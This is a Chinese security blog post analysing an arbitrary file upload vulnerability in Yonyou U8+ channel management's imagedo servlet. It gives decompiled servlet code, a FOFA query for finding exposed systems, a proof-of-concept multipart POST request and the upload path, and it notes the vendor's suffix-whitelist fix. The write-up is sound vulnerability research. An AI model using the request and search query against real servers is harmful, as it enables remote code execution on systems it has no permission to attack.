---
title: "用友U8+渠道管理(高级版) imagedo 文件上传漏洞"
source: https://mrxn.net/jswz/yonyou-imagedo-upload-rce.html
asset_dir: assets/用友u8+渠道管理(高级版)-imagedo-文件上传漏洞
---

# 用友U8+渠道管理(高级版) imagedo 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/21 08:11
- 802浏览
- [0评论](#comment)
- 58分钟阅读

深入探索

云安全解决方案

数据库

SQL注入防护

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)U8+是用友网络科技股份有限公司推出的企业管理综合平台，广泛应用于财务、进销存、人力资源等企业核心业务系统中。在U8+渠道管理（高级版）模块中，存在一处[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，位于其 `imagedo` 接口。攻击者可通过构造特定的HTTP请求，将恶意脚本或可执行文件上传至服务器。该漏洞可能导致攻击者在目标服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而获取服务器控制权限，进一步窃取敏感数据、篡改业务数据或对内网其他系统发起攻击。

漏洞预警服务

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V15.0, V13

# fofa语法

> title="渠道管理（高级版）"

# 漏洞分析

根据补丁变化

[![用友U8+渠道管理(高级版) imagedo 文件上传漏洞](images/img-001-24c8de250da2.webp)](https://image.mrxn.net/1bae07efe9c04506b576186a6e75bb6a.webp)

直接看 `UploadImageServlet` 在那里引用了

```
<servlet>
    <servlet-name>UploadImageServlet</servlet-name>
    <servlet-class>com.gxfcsoft.framework.core.UploadImageServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>UploadImageServlet</servlet-name>
    <url-pattern>*.imagedo</url-pattern>
</servlet-mapping>
```

ok，根据servlet的映射，任意以`.imagedo` 结尾的请求都会经由`UploadImageServlet` 处理，跟进看下它的实现逻辑

深入探索

安全认证考试

软件

安全运维咨询

```
package com.gxfcsoft.framework.core;

import com.alibaba.fastjson.JSONObject;
import com.gxfcsoft.framework.base.util.Oid;
import com.gxfcsoft.framework.base.util.PathUtil;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.fileupload.FileUploadException;
import org.apache.commons.fileupload.ProgressListener;
import org.apache.commons.fileupload.disk.DiskFileItemFactory;
import org.apache.commons.fileupload.servlet.ServletFileUpload;

public class UploadImageServlet extends HttpServlet {
    private static final long serialVersionUID = -3805966261508992979L;

    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doPost(req, resp);
    }

    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        String savePath = PathUtil.getPictureAbsoluteDirectory("default");
        String newname = "";
        String oldname = "";
        String message = "1";
        resp.setCharacterEncoding("utf-8");
        resp.setContentType("text/html;charset=utf-8");
        PrintWriter outPrint = resp.getWriter();

        try {
            File saveFile = new File(savePath);
            DiskFileItemFactory factory = new DiskFileItemFactory();
            factory.setSizeThreshold(102400);
            factory.setRepository(saveFile);
            ServletFileUpload upload = new ServletFileUpload(factory);
            upload.setProgressListener(new ProgressListener() {
                public void update(long arg0, long arg1, int arg2) {
                }
            });
            upload.setHeaderEncoding("UTF-8");
            upload.setFileSizeMax(5242880L);
            upload.setSizeMax(20971520L);
            List<FileItem> list = upload.parseRequest(req);
            if (list.size() == 0) {
                message = "500";
            }

            String code = "";
            JSONObject obj = new JSONObject();
            List<Map<String, String>> lists = new ArrayList();
            Map<String, String> map = new LinkedHashMap();

            for(FileItem item : list) {
                if (item.isFormField()) {
                    code = item.getString("utf-8");
                } else {
                    String filename = item.getName();
                    filename = filename.substring(filename.lastIndexOf("\\") + 1);
                    String suffix = filename.substring(filename.indexOf("."));
                    String randomName = Oid.getOid() + suffix;
                    if (newname == "") {
                        newname = randomName;
                    } else {
                        newname = newname + ";" + randomName;
                    }

                    if (oldname == "") {
                        oldname = filename;
                    } else {
                        oldname = oldname + ";" + filename;
                    }

                    savePath.replace("", "");
                    InputStream in = item.getInputStream();
                    FileOutputStream out = new FileOutputStream(savePath + "\\" + randomName);
                    byte[] buffer = new byte[1024];
                    int len = 0;

                    while((len = in.read(buffer)) > 0) {
                        out.write(buffer, 0, len);
                    }

                    in.close();
                    out.close();
                    item.delete();
                }
            }

            map.put("oldname", oldname);
            map.put("newname", newname);
            lists.add(map);
            obj.put("fileInfo", lists);
            obj.put("flag", "0");
            outPrint.print(obj);
        } catch (IOException e) {
            message = "1";
            e.printStackTrace();
        } catch (FileUploadException e) {
            message = "1";
            e.printStackTrace();
        } finally {
            outPrint.flush();
            outPrint.close();
        }

    }
}
```

文件后缀从上传文件名中获取，然后拼接到`randomName`后面形成新的文件名，期间对文件类型和内容无校验或过滤，因此造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，非常朴实无华！

# 漏洞复现

```
POST /temp.imagedo HTTP/1.1
Host: u8.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.PNG"

TEST
------WebKitFormBoundary--
```

[![用友U8+渠道管理(高级版) imagedo 文件上传漏洞](images/img-002-100159e7743d.webp)](https://image.mrxn.net/6b62b8a62d9a49c6ba4b07130be9bec7.webp)

根据**getPictureAbsoluteDirectory**方法可知

漏洞预警服务

[![用友U8+渠道管理(高级版) imagedo 文件上传漏洞](images/img-003-5aed7e409182.webp)](https://image.mrxn.net/6eda82ab12e5484e8edba97c47ca4456.webp)

上传位置默认为 `/userfile/default/picture/` 目录下，访问上传文件

[![用友U8+渠道管理(高级版) imagedo 文件上传漏洞](images/img-004-fdf6802b5358.webp)](https://image.mrxn.net/71bed2c916c5493bb94c465a57f538bd.webp)

成功[执行我们上传代码](https://mrxn.net/tag/rce)

官方补丁修复也很直接，直接正则检测后缀是否为白名单

[![用友U8+渠道管理(高级版) imagedo 文件上传漏洞](images/img-005-814c9d663954.webp)](https://image.mrxn.net/b0da57acd37c49db9602402fdd9be968.webp)

# 参考

- [关于U8+渠道管理(高级版)存在文件上传漏洞的公告](https://security.yonyou.com/#/noticeInfo?id=727)
- <https://security.yonyou.com/#/patchInfo?identifier=29c55387e6274480b613343d8ffcd4e2>

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)
- [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
